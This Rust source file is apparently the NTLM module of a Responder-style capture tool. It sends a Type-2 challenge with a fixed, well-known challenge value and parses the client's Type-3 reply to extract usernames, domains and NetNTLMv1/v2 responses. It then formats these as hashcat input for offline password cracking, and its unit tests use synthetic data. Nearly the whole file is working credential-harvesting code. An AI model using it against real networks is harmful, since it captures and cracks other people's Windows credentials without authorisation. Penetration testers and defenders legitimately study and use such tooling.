//! NTLMSSP message handling: build a Type-2 challenge, parse the Type-3
//! authenticate message, and format captured NetNTLMv1/v2 responses in the
//! layout hashcat expects (`-m 5500` / `-m 5600`).

/// Fixed 8-byte server challenge (the well-known Responder value), so captures
/// are recognisable and reproducible.
pub const CHALLENGE: [u8; 8] = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];

const SIG: &[u8] = b"NTLMSSP\0";

#[derive(Debug, Clone)]
pub struct NetNtlm {
    pub user: String,
    pub domain: String,
    pub workstation: String,
    pub lm_resp: Vec<u8>,
    pub nt_resp: Vec<u8>,
}

impl NetNtlm {
    /// hashcat line for this capture (v2 when the NT response carries a blob).
    pub fn hashcat(&self) -> String {
        let chal = hex(&CHALLENGE);
        if self.nt_resp.len() > 24 {
            // NetNTLMv2: user::domain:challenge:NTProofStr:blob
            let proof = hex(&self.nt_resp[..16]);
            let blob = hex(&self.nt_resp[16..]);
            format!("{}::{}:{}:{}:{}", self.user, self.domain, chal, proof, blob)
        } else {
            // NetNTLMv1: user::domain:LMresp:NTresp:challenge
            format!(
                "{}::{}:{}:{}:{}",
                self.user,
                self.domain,
                hex(&self.lm_resp),
                hex(&self.nt_resp),
                chal
            )
        }
    }

    pub fn mode(&self) -> &'static str {
        if self.nt_resp.len() > 24 {
            "NetNTLMv2 (hashcat -m 5600)"
        } else {
            "NetNTLMv1 (hashcat -m 5500)"
        }
    }
}

/// Minimal NTLMSSP Type-2 (challenge) message with our fixed challenge and a
/// small TargetInfo block, enough to elicit a Type-3 from a client.
pub fn build_type2() -> Vec<u8> {
    let target_info: [u8; 4] = [0x00, 0x00, 0x00, 0x00]; // MsvAvEOL
    let mut m = Vec::new();
    m.extend_from_slice(SIG); // signature
    m.extend_from_slice(&2u32.to_le_bytes()); // type 2
    // TargetName SecBuf (empty)
    m.extend_from_slice(&secbuf(0, 0, 56));
    // Negotiate flags: Unicode | Target | NTLM | AlwaysSign | TargetInfo
    let flags: u32 = 0x0000_0001 | 0x0000_0004 | 0x0000_0200 | 0x0000_8000 | 0x0080_0000;
    m.extend_from_slice(&flags.to_le_bytes());
    m.extend_from_slice(&CHALLENGE); // server challenge
    m.extend_from_slice(&[0u8; 8]); // reserved
    // TargetInfo SecBuf -> placed right after the fixed 56-byte header
    m.extend_from_slice(&secbuf(
        target_info.len() as u16,
        target_info.len() as u16,
        56,
    ));
    m.extend_from_slice(&target_info);
    m
}

fn secbuf(len: u16, maxlen: u16, offset: u32) -> [u8; 8] {
    let mut b = [0u8; 8];
    b[0..2].copy_from_slice(&len.to_le_bytes());
    b[2..4].copy_from_slice(&maxlen.to_le_bytes());
    b[4..8].copy_from_slice(&offset.to_le_bytes());
    b
}

/// Parse an NTLMSSP Type-3 message into a capturable NetNTLM response.
pub fn parse_type3(msg: &[u8]) -> Option<NetNtlm> {
    if msg.len() < 52 || &msg[0..8] != SIG {
        return None;
    }
    if u32::from_le_bytes(msg[8..12].try_into().ok()?) != 3 {
        return None;
    }
    let lm = read_secbuf_field(msg, 12)?;
    let nt = read_secbuf_field(msg, 20)?;
    let domain = read_secbuf_utf16(msg, 28)?;
    let user = read_secbuf_utf16(msg, 36)?;
    let workstation = read_secbuf_utf16(msg, 44).unwrap_or_default();
    if user.is_empty() || nt.is_empty() {
        return None;
    }
    Some(NetNtlm {
        user,
        domain,
        workstation,
        lm_resp: lm,
        nt_resp: nt,
    })
}

/// Read the raw bytes a SecBuf (at `pos`) points to.
fn read_secbuf_field(msg: &[u8], pos: usize) -> Option<Vec<u8>> {
    let len = u16::from_le_bytes(msg.get(pos..pos + 2)?.try_into().ok()?) as usize;
    let off = u32::from_le_bytes(msg.get(pos + 4..pos + 8)?.try_into().ok()?) as usize;
    msg.get(off..off + len).map(|s| s.to_vec())
}

/// Read a SecBuf as a UTF-16LE string.
fn read_secbuf_utf16(msg: &[u8], pos: usize) -> Option<String> {
    let raw = read_secbuf_field(msg, pos)?;
    let (pairs, _) = raw.as_chunks::<2>();
    let u16s: Vec<u16> = pairs.iter().map(|&[a, b]| u16::from_le_bytes([a, b])).collect();
    Some(String::from_utf16_lossy(&u16s))
}

pub fn hex(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for byte in b {
        s.push_str(&format!("{byte:02x}"));
    }
    s
}

/// Locate an embedded NTLMSSP message inside a larger blob (e.g. SMB/SPNEGO).
pub fn find_ntlmssp(buf: &[u8]) -> Option<&[u8]> {
    buf.windows(SIG.len())
        .position(|w| w == SIG)
        .map(|i| &buf[i..])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn type2_has_signature_and_challenge() {
        let m = build_type2();
        assert_eq!(&m[0..8], SIG);
        assert_eq!(u32::from_le_bytes(m[8..12].try_into().unwrap()), 2);
        // challenge sits at the fixed offset 24
        assert_eq!(&m[24..32], &CHALLENGE);
    }

    #[test]
    fn parses_type3_v2_and_formats_hashcat() {
        // Build a synthetic Type-3 with a 32-byte NT response (v2).
        let user = "alice";
        let domain = "CORP";
        let nt = vec![0xABu8; 32];
        let msg = synth_type3(user, domain, &nt, &[0u8; 24]);
        let parsed = parse_type3(&msg).expect("parse");
        assert_eq!(parsed.user, "alice");
        assert_eq!(parsed.domain, "CORP");
        let line = parsed.hashcat();
        assert!(line.starts_with("alice::CORP:1122334455667788:"));
        assert!(parsed.mode().contains("5600"));
    }

    #[test]
    fn find_embedded_signature() {
        let mut blob = vec![0u8; 20];
        blob.extend_from_slice(b"NTLMSSP\0rest");
        assert!(find_ntlmssp(&blob).unwrap().starts_with(b"NTLMSSP\0"));
    }

    fn synth_type3(user: &str, domain: &str, nt: &[u8], lm: &[u8]) -> Vec<u8> {
        let header = 64usize;
        let du: Vec<u8> = domain.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let uu: Vec<u8> = user.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        let mut payload = Vec::new();
        let lm_off = header;
        payload.extend_from_slice(lm);
        let nt_off = header + payload.len();
        payload.extend_from_slice(nt);
        let dom_off = header + payload.len();
        payload.extend_from_slice(&du);
        let usr_off = header + payload.len();
        payload.extend_from_slice(&uu);

        let mut m = vec![0u8; header];
        m[0..8].copy_from_slice(SIG);
        m[8..12].copy_from_slice(&3u32.to_le_bytes());
        m[12..20].copy_from_slice(&secbuf(lm.len() as u16, lm.len() as u16, lm_off as u32));
        m[20..28].copy_from_slice(&secbuf(nt.len() as u16, nt.len() as u16, nt_off as u32));
        m[28..36].copy_from_slice(&secbuf(du.len() as u16, du.len() as u16, dom_off as u32));
        m[36..44].copy_from_slice(&secbuf(uu.len() as u16, uu.len() as u16, usr_off as u32));
        m[44..52].copy_from_slice(&secbuf(0, 0, header as u32));
        m.extend_from_slice(&payload);
        m
    }
}
